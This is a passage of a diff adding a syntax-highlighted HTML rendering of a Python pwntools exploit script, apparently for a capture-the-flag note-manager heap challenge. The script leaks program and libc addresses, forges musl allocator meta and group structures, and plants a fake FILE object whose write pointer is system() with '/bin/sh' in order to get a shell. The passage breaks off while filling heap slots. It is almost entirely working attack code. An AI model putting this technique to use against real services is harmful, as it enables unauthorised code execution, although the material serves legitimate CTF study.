+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;option:&#34;</span>, <span style=color:#4070a0>&#39;2&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;name size:&#34;</span>, <span style=color:#007020>str</span>(name_size))
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;name:&#34;</span>, name)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>delete_note</span>(name_size, name):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;option:&#34;</span>, <span style=color:#4070a0>&#39;3&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;name size:&#34;</span>, <span style=color:#007020>str</span>(name_size))
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;name:&#34;</span>, name)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>forget_all_notes</span>():
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;option:&#34;</span>, <span style=color:#4070a0>&#39;4&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>translate</span>(string):
+</span></span><span style=display:flex><span>    string <span style=color:#666>=</span> string[::<span style=color:#666>-</span><span style=color:#40a070>1</span>]
+</span></span><span style=display:flex><span>    list_str <span style=color:#666>=</span> <span style=color:#007020>list</span>(string)
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>0</span>, <span style=color:#007020>len</span>(string), <span style=color:#40a070>2</span>):
+</span></span><span style=display:flex><span>        list_str[i], list_str[i <span style=color:#666>+</span> <span style=color:#40a070>1</span>] <span style=color:#666>=</span> list_str[i <span style=color:#666>+</span> <span style=color:#40a070>1</span>], list_str[i]
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> <span style=color:#4070a0>&#34;&#34;</span><span style=color:#666>.</span>join(list_str)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>add_note(<span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;bbbb</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;BBBB</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>add_note(<span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;cccc</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;CCCC</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>add_note(<span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;bbbb</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;BBBB</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 9 0x28 group</span>
+</span></span><span style=display:flex><span>forget_all_notes()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>add_note(<span style=color:#40a070>0x18</span>, <span style=color:#4070a0>&#39;aaaa</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;A&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x28</span>) <span style=color:#60a0b0;font-style:italic># name and struct in first meta, content in the next</span>
+</span></span><span style=display:flex><span>                                           <span style=color:#60a0b0;font-style:italic># the first mate will be inactivate</span>
+</span></span><span style=display:flex><span>add_note(<span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;bbbb</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;BBBB</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 4 0x28 group</span>
+</span></span><span style=display:flex><span>add_note(<span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;cccc</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;CCCC</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 7 0x28 group</span>
+</span></span><span style=display:flex><span>add_note(<span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;dddd</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;DDDD</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 10 0x28</span>
+</span></span><span style=display:flex><span>add_note(<span style=color:#40a070>0x18</span>, <span style=color:#4070a0>&#39;eeee</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x18</span>, <span style=color:#4070a0>&#39;EEEE</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 1 0x28 group, sencond meta will be inactivate</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>delete_note(<span style=color:#40a070>0x4</span>, <span style=color:#4070a0>&#39;aaaa&#39;</span>) <span style=color:#60a0b0;font-style:italic># free three 0x28 group</span>
+</span></span><span style=display:flex><span>add_note(<span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;fill</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;fill</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>add_note(<span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;fill</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;fill</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>add_note(<span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;fill</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;fill</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>add_note(<span style=color:#40a070>0xc</span>, <span style=color:#4070a0>&#39;replace</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0xc</span>, <span style=color:#4070a0>&#39;replace</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>find_note(<span style=color:#40a070>0x4</span>, <span style=color:#4070a0>&#39;aaaa&#39;</span>)
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># leaked</span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;0x28:&#34;</span>)
+</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>12</span>))
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recv(<span style=color:#40a070>4</span>)
+</span></span><span style=display:flex><span>proc_base <span style=color:#666>=</span> <span style=color:#007020>int</span>(translate(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>12</span>)), base <span style=color:#666>=</span> <span style=color:#40a070>16</span>) <span style=color:#666>-</span> <span style=color:#40a070>0x4860</span>
+</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;proc_base: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(proc_base))
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recv(<span style=color:#40a070>4</span>)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recv(<span style=color:#40a070>32</span>)
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># this is the donately address</span>
+</span></span><span style=display:flex><span>libc_base <span style=color:#666>=</span> <span style=color:#007020>int</span>(translate(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>12</span>)), base <span style=color:#666>=</span> <span style=color:#40a070>16</span>) <span style=color:#666>-</span> <span style=color:#40a070>0xB7BB0</span>
+</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#007020>hex</span>(libc_base))
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recv(<span style=color:#40a070>4</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># start it all over again</span>
+</span></span><span style=display:flex><span>add_note(<span style=color:#40a070>0xc</span>, <span style=color:#4070a0>&#39;bbbb</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0xc</span>, <span style=color:#4070a0>&#39;BBBB</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>forget_all_notes()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>add_note(<span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;bbbb</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;BBBB</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>add_note(<span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;cccc</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;CCCC</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>add_note(<span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;bbbb</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;BBBB</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 9 0x28 group</span>
+</span></span><span style=display:flex><span>forget_all_notes()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>add_note(<span style=color:#40a070>0x18</span>, <span style=color:#4070a0>&#39;aaaa</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;A&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x28</span>) <span style=color:#60a0b0;font-style:italic># name and struct in first meta, content in the next</span>
+</span></span><span style=display:flex><span>                                           <span style=color:#60a0b0;font-style:italic># the first mate will be inactivate</span>
+</span></span><span style=display:flex><span>add_note(<span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;bbbb</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;BBBB</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 4 0x28 group</span>
+</span></span><span style=display:flex><span>add_note(<span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;cccc</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;CCCC</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 7 0x28 group</span>
+</span></span><span style=display:flex><span>add_note(<span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;dddd</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;DDDD</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 10 0x28</span>
+</span></span><span style=display:flex><span>add_note(<span style=color:#40a070>0x18</span>, <span style=color:#4070a0>&#39;eeee</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x18</span>, <span style=color:#4070a0>&#39;EEEE</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 1 0x28 group, sencond meta will be inactivate</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>delete_note(<span style=color:#40a070>0x4</span>, <span style=color:#4070a0>&#39;aaaa&#39;</span>) <span style=color:#60a0b0;font-style:italic># free three 0x28 group</span>
+</span></span><span style=display:flex><span>add_note(<span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;fill</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;fill</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>add_note(<span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;fill</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;fill</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>add_note(<span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;fill</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;fill</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>known_name_addr <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0xB7080</span>
+</span></span><span style=display:flex><span>known_name <span style=color:#666>=</span> p64(libc_base <span style=color:#666>+</span> <span style=color:#40a070>0xB7F50</span>)
+</span></span><span style=display:flex><span>secret_addr <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0xB4AC0</span>
+</span></span><span style=display:flex><span>fake_note <span style=color:#666>=</span> p64(known_name_addr) <span style=color:#666>+</span> p64(secret_addr)
+</span></span><span style=display:flex><span>fake_note <span style=color:#666>+=</span> p64(<span style=color:#40a070>0x8</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x28</span>)
+</span></span><span style=display:flex><span>fake_note <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>)[:<span style=color:#666>-</span><span style=color:#40a070>1</span>] <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>
+</span></span><span style=display:flex><span>add_note(<span style=color:#40a070>0x70</span>, <span style=color:#4070a0>&#39;replace</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x28</span>, fake_note)
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># gdb.attach(sh)</span>
+</span></span><span style=display:flex><span>find_note(<span style=color:#40a070>8</span>, known_name)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;0x28:&#34;</span>)
+</span></span><span style=display:flex><span>secret <span style=color:#666>=</span> <span style=color:#007020>int</span>(translate(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>16</span>)), base <span style=color:#666>=</span> <span style=color:#40a070>16</span>)
+</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;secret: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(secret))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># start it all over again</span>
+</span></span><span style=display:flex><span>forget_all_notes()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># fake the meta</span>
+</span></span><span style=display:flex><span>ofl_head_addr <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0xB6E48</span>
+</span></span><span style=display:flex><span>sc <span style=color:#666>=</span> <span style=color:#40a070>0</span>
+</span></span><span style=display:flex><span>freeable <span style=color:#666>=</span> <span style=color:#40a070>1</span>
+</span></span><span style=display:flex><span>last_idx <span style=color:#666>=</span> <span style=color:#40a070>0</span>
+</span></span><span style=display:flex><span>maplen <span style=color:#666>=</span> <span style=color:#40a070>1</span>
+</span></span><span style=display:flex><span>fake_group_addr_base <span style=color:#666>=</span> libc_base <span style=color:#666>-</span> <span style=color:#40a070>0x7000</span> <span style=color:#666>+</span> <span style=color:#40a070>0x20</span>
+</span></span><span style=display:flex><span>fake_group_addr <span style=color:#666>=</span> libc_base <span style=color:#666>-</span> <span style=color:#40a070>0x7000</span> <span style=color:#666>+</span> <span style=color:#40a070>0x120</span> <span style=color:#666>+</span> <span style=color:#40a070>0x1000</span>
+</span></span><span style=display:flex><span>fake_mem_base <span style=color:#666>=</span> fake_group_addr_base <span style=color:#666>-</span> <span style=color:#40a070>0x20</span> <span style=color:#666>+</span> <span style=color:#40a070>0x1000</span> <span style=color:#666>+</span> <span style=color:#40a070>0x100</span>
+</span></span><span style=display:flex><span>fake_meta_addr <span style=color:#666>=</span> fake_group_addr_base <span style=color:#666>-</span> <span style=color:#40a070>0x20</span> <span style=color:#666>+</span> <span style=color:#40a070>0x1000</span> <span style=color:#666>+</span> <span style=color:#40a070>0x18</span>
+</span></span><span style=display:flex><span>fake_group <span style=color:#666>=</span> <span style=color:#4070a0>&#34;AAAABBBBCCCCDDDD&#34;</span> <span style=color:#60a0b0;font-style:italic># sign</span>
+</span></span><span style=display:flex><span>fake_group <span style=color:#666>=</span> fake_group<span style=color:#666>.</span>ljust(<span style=color:#40a070>0x1000</span> <span style=color:#666>-</span> <span style=color:#40a070>0x20</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>fake_group <span style=color:#666>+=</span> p64(secret) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>1</span>) <span style=color:#60a0b0;font-style:italic># 0x10</span>
+</span></span><span style=display:flex><span>fake_meta <span style=color:#666>=</span> <span style=color:#4070a0>&#34;&#34;</span>
+</span></span><span style=display:flex><span>fake_meta <span style=color:#666>+=</span> p64(ofl_head_addr <span style=color:#666>-</span> <span style=color:#40a070>0x8</span>) <span style=color:#60a0b0;font-style:italic># next</span>
+</span></span><span style=display:flex><span>fake_meta <span style=color:#666>+=</span> p64(proc_base <span style=color:#666>+</span> <span style=color:#40a070>0x4450</span>) <span style=color:#60a0b0;font-style:italic># prev</span>
+</span></span><span style=display:flex><span>fake_meta <span style=color:#666>+=</span> p64(fake_mem_base <span style=color:#666>+</span> <span style=color:#40a070>0x10</span>)
+</span></span><span style=display:flex><span>fake_meta <span style=color:#666>+=</span> p32(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p32(<span style=color:#40a070>0</span>) <span style=color:#60a0b0;font-style:italic># avail_mask, freed_masx</span>
+</span></span><span style=display:flex><span>fake_meta <span style=color:#666>+=</span> p64((maplen <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>12</span>) <span style=color:#666>|</span> (sc <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>6</span>) <span style=color:#666>|</span> (freeable <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>5</span>) <span style=color:#666>|</span> last_idx)
+</span></span><span style=display:flex><span>fake_meta <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>fake_group <span style=color:#666>+=</span> fake_meta
+</span></span><span style=display:flex><span>fake_group <span style=color:#666>=</span> fake_group<span style=color:#666>.</span>ljust(<span style=color:#40a070>0x1000</span> <span style=color:#666>+</span> <span style=color:#40a070>0x100</span> <span style=color:#666>-</span> <span style=color:#40a070>0x20</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 0x1100</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># fake a group here</span>
+</span></span><span style=display:flex><span>fake_group <span style=color:#666>+=</span> p64(fake_meta_addr) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#60a0b0;font-style:italic># 0x1110</span>
+</span></span><span style=display:flex><span>fake_group <span style=color:#666>+=</span> p64(fake_meta_addr) <span style=color:#666>+</span> p32(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p16(<span style=color:#40a070>0x00</span>) <span style=color:#666>+</span> p16(<span style=color:#40a070>0</span>) <span style=color:#60a0b0;font-style:italic># 0x1120</span>
+</span></span><span style=display:flex><span>fake_file <span style=color:#666>=</span> <span style=color:#4070a0>&#39;/bin/sh</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span> <span style=color:#60a0b0;font-style:italic># flags</span>
+</span></span><span style=display:flex><span>fake_file <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>*</span> <span style=color:#40a070>2</span> <span style=color:#60a0b0;font-style:italic># rpos, rend</span>
+</span></span><span style=display:flex><span>fake_file <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#60a0b0;font-style:italic># (*close)(FILE *);</span>
+</span></span><span style=display:flex><span>fake_file <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>1</span>) <span style=color:#60a0b0;font-style:italic># wend, wpos</span>
+</span></span><span style=display:flex><span>fake_file <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>fake_file <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#60a0b0;font-style:italic># wbase</span>
+</span></span><span style=display:flex><span>fake_file <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#60a0b0;font-style:italic># (*read)(FILE *, unsigned char *, size_t)</span>
+</span></span><span style=display:flex><span>system <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;system&#34;</span>]
+</span></span><span style=display:flex><span>fake_file <span style=color:#666>+=</span> p64(system) <span style=color:#60a0b0;font-style:italic># (*write)(FILE *, const unsigned char *, size_t)</span>
+</span></span><span style=display:flex><span>fake_group <span style=color:#666>+=</span> fake_file <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>add_note(<span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;bbbb</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;BBBB</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>add_note(<span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;cccc</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;CCCC</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>add_note(<span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;bbbb</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;BBBB</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 9 0x28 group</span>
+</span></span><span style=display:flex><span>forget_all_notes()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>add_note(<span style=color:#40a070>0x18</span>, <span style=color:#4070a0>&#39;aaaa</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;A&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x28</span>) <span style=color:#60a0b0;font-style:italic># name and struct in first meta, content in the next</span>
+</span></span><span style=display:flex><span>                                           <span style=color:#60a0b0;font-style:italic># the first mate will be inactivate</span>
+</span></span><span style=display:flex><span>add_note(<span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;bbbb</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;BBBB</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 4 0x28 group</span>
+</span></span><span style=display:flex><span>add_note(<span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;cccc</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;CCCC</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 7 0x28 group</span>
+</span></span><span style=display:flex><span>add_note(<span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;dddd</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;DDDD</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 10 0x28</span>
+</span></span><span style=display:flex><span>add_note(<span style=color:#40a070>0x18</span>, <span style=color:#4070a0>&#39;eeee</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x2000</span>, fake_group) <span style=color:#60a0b0;font-style:italic># 1 0x28 group, sencond meta will be inactivate</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>delete_note(<span style=color:#40a070>0x4</span>, <span style=color:#4070a0>&#39;aaaa&#39;</span>) <span style=color:#60a0b0;font-style:italic># free three 0x28 group</span>
+</span></span><span style=display:flex><span>add_note(<span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;fill</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;fill</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>add_note(<span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;fill</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;fill</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>add_note(<span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;fill</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;fill</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>add_note(<span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;fill</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;fill</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>add_note(<span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;fill</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;fill</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
